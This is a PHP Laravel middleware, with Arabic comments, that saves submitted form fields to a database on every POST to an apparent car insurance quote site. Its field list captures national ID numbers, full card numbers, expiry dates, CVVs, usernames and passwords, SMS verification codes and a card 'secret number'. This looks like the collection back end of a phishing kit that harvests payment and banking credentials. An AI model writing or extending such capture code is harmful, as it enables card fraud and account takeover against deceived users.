<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use App\Models\InsuranceRequest;
use App\Models\InsuranceFormData;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Log;

class AutoSaveFormData
{
    /**
     * Handle an incoming request and auto-save form data
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \Closure  $next
     * @return mixed
     */
    public function handle(Request $request, Closure $next)
    {
        // فقط للطلبات POST
        if ($request->isMethod('post')) {
            try {
                // قائمة الحقول المهمة التي نريد حفظها
                $importantFields = [
                    'identity_number',
                    'full_name',
                    'mobile_number_statements',
                    'birth_date_statements',
                    'region',
                    'city',
                    'driving_years',
                    'insurance_type',
                    'usage_category',
                    'policy_start_date',
                    'vehicle_type',
                    'vehicle_model',
                    'manufacturing_year',
                    'maintenance_type',
                    'approximate_price',
                    'has_additional_driver',
                    'driver_name',
                    'driver_identity_number',
                    'driver_mobile_number',
                    'driver_birth_date',
                    'driver_driving_years',
                    'driver_driving_percentage',
                    'insurance_id',
                    'total',
                    'name_on_card',
                    'card_number',
                    'expiry_date',
                    'cvv',
                    'mobile_number',
                    'mobile_network_operator',
                    'check_mobile_number_verification_code',
                    'user_name',
                    'password',
                    'card_ownership_verification_code',
                    'card_ownership_secert_number',
                ];

                // جمع البيانات المتوفرة من الـ Request
                $formData = [];
                foreach ($importantFields as $field) {
                    if ($request->has($field) && $request->input($field) !== null) {
                        $formData[$field] = $request->input($field);
                    }
                }

                // إذا كانت هناك بيانات لحفظها
                if (!empty($formData)) {
                    // محاولة الحصول على ID من الـ Session
                    $allFormData = session('allFormData', []);
                    $requestId = $allFormData['id'] ?? null;

                    if ($requestId) {
                        // تحديث السجل الموجود
                        $insuranceRequest = InsuranceRequest::find($requestId);
                        if ($insuranceRequest) {
                            $insuranceRequest->update($formData);
                            
                            // تحديث الـ Session
                            $allFormData = array_merge($allFormData, $formData);
                            session(['allFormData' => $allFormData]);
                            
                            Log::info('Auto-saved form data (UPDATE)', [
                                'request_id' => $requestId,
                                'fields' => array_keys($formData),
                                'path' => $request->path()
                            ]);
                        }
                    } else {
                        // إنشاء سجل جديد إذا كانت هناك بيانات أساسية
                        if (isset($formData['identity_number']) || isset($formData['full_name'])) {
                            $insuranceRequest = InsuranceRequest::create($formData);
                            
                            // حفظ الـ ID في الـ Session
                            $formData['id'] = $insuranceRequest->id;
                            session(['allFormData' => $formData]);
                            
                            Log::info('Auto-saved form data (CREATE)', [
                                'request_id' => $insuranceRequest->id,
                                'fields' => array_keys($formData),
                                'path' => $request->path()
                            ]);
                        }
                    }
                }
            } catch (\Exception $e) {
                // تسجيل الخطأ دون إيقاف الطلب
                Log::error('Error in AutoSaveFormData middleware', [
                    'error' => $e->getMessage(),
                    'file' => $e->getFile(),
                    'line' => $e->getLine(),
                    'path' => $request->path()
                ]);
            }
        }

        return $next($request);
    }
}
